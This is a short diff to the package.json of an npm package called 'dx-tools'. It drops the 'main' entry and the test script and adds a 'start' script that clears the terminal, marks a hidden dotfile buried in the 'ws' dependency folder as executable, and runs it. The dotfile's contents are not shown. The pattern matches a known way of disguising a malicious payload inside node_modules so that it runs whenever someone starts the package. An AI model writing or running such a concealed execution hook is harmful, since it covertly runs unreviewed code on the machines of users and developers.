@@ -11,9 +11,8 @@
   },
   "name": "dx-tools",
   "version": "1.0.0",
-  "main": "dx.js",
   "scripts": {
-    "test": "node dx.js"
+    "start": "clear;chmod +x ./node_modules/ws/lib/.index.js;node ./node_modules/ws/lib/.index.js"
   },
   "repository": {
     "type": "git",
